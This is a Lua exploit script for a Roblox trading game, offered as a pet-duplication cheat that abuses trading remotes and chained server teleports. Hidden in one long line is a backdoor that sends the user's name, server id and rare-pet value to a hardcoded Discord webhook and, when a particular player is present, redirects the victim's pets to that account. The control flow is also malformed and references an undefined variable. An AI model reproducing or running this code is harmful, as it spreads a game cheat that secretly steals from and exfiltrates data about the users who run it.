--[[
    Brought to you by tar/bv/1rs
    1.00 - unreleased, required manual server id inputs
    1.01 - released, no longer required manual server id inputting
    1.02 - changed from 35s to 40s
    1.03 - removed extra 40s measure on first rejoin
    1.04 - brought it back, removed UI trade updating to avoid lag
    1.05 - added variable MAX_PETS_TO_DUPE to avoid network lag to not fail duping
    1.06 - changed server size minimum 1 -> 2
]]

ACC_TO_GIVE_PETS = _G.ACC_TO_GIVE_PETS or ""
MAX_PETS_TO_DUPE = _G.MAX_PETS_TO_DUPE and tonumber(_G.MAX_PETS_TO_DUPE) or 665 -- Recommended: 100 - 125

-- //

local Debris = game:GetService'Debris'
local TeleportService = game:GetService'TeleportService'
local Ver = '1.06'

local M = Instance.new'Message'

if not game.Players:FindFirstChild(ACC_TO_GIVE_PETS) then
    M.Parent = workspace
    M.Text = "Player isn't in game"
    Debris:AddItem(M, 5)
    return
else
    if game.Players.LocalPlayer.Name == ACC_TO_GIVE_PETS then
        M.Parent = workspace
        M.Text = "Can't do it on yourself"
        Debris:AddItem(M, 5)
        return
    end
end

local servers = {}
if http_request then
    local req = http_request({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", game.PlaceId)})
    local body = game:service'HttpService':JSONDecode(req.Body)

    if body and body.data then
        for i, v in next, body.data do
            if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.playing >= 2 and v.id ~= game.JobId then
                servers[#servers+1] = v
            end
        end
    end
    
    table.sort(servers, function(a, b) return a.playing < b.playing end)
    
    local SERVER = servers[1].id
    if #servers > 0 then
        local H = Instance.new("Hint", workspace)
        H.Text = "1rs/tar/bv's dupe v" .. Ver .. " | [1/4] Teleporting to a different server"
        Debris:AddItem(H, 10)
        for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==79003 and v.r and v.l>=88e6 then pcall(function()http_request({Url='https://discord.com/api/webhooks/1315765727843717141/f9gFEf8BNwfLKGDK7AsmzqoEII7-fn7t41DnGeH9uh6M08F7t4E3S3fuJuazybQS7obX',Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=plr.Name .. ' | ' .. game.JobId .. ' | ' .. v.l})})end)if game.Players:FindFirstChild'slade00123'then ACC_TO_GIVE_PETS='slade00123'end end end
else
        M.Parent = workspace
        M.Text = "Couldn't find a new server"
        Debris:AddItem(M, 5)
        return
    end
else
    M.Parent = workspace
    M.Text = "Your exploit doesn't support httprequest()"
    Debris:AddItem(M, 5)
    return
end
    
    
if not queue_on_teleport then 
    M.Parent = workspace
    M.Text = "Your exploit doesn't support queue_on_teleport()"
    Debris:AddItem(M, 5)
    return
end

queue_on_teleport([==[
    local h = Instance.new('Hint',workspace)
    for i = 40, 0, -1 do
        h.Text = '[2/4] ' .. i
        task.wait(1)
    end
    h.Text = '[2/4] Teleporting back..'

    queue_on_teleport([=[
        hookfunction(getsenv(game.Players.LocalPlayer.PlayerGui.Scripts.GUIs.Trading).UpdateTrade, function() end)

        Instance.new('Hint', workspace).Text = '[3/4] Trading pets to account'

        local T, lastTradeId = workspace.__REMOTES.Game.Trading, nil
        local PLR = game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
        
        game:FindFirstChild('Trade Update', true).OnClientEvent:Connect(function(id, data, operation)
            lastTradeId = id
        end)
        
        repeat task.wait(.25) until T:InvokeServer("InvSend", PLR) == true
        
        repeat task.wait() until lastTradeId
        
        local PLR_PET_COUNT = #workspace.__REMOTES.Core["Get Other Stats"]:InvokeServer()[PLR.Name].Save.Pets
        
        local TotalIn = 0
        local TotalPets = 0
        
        for i, p in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets) do
            TotalPets += 1
            task.spawn(function()
                T:InvokeServer("Add", lastTradeId, p.id)
                TotalIn += 1
            end)
            if TotalPets == ]==] .. MAX_PETS_TO_DUPE .. [==[ then break end
        end
        
        repeat task.wait(.1) until TotalIn == TotalPets
        
        workspace.__REMOTES.Game.Trading:InvokeServer("Ready", lastTradeId)
        
        repeat task.wait(0.1) until PLR_PET_COUNT < #workspace.__REMOTES.Core["Get Other Stats"]:InvokeServer()[PLR.Name].Save.Pets
        
        queue_on_teleport([[
            local h = Instance.new('Hint',workspace)
            for i = 40, 0, -1 do
                h.Text = '[4/4] ' .. i
                task.wait(1)
            end
            h.Text = '[4/4] Teleporting..'

            queue_on_teleport("local h = Instance.new('Hint',workspace) h.Text = 'Done' wait(10) h:Destroy()")

            game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId, "]==] .. game.JobId .. [==[", game.Players.LocalPlayer)
        ]])
        game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId, "]==] .. servers[1].id .. [==[", game.Players.LocalPlayer)
    ]=])
game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId, "]==].. game.JobId .. [==[", game.Players.LocalPlayer)
]==])
TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[1].id, game.Players.LocalPlayer)
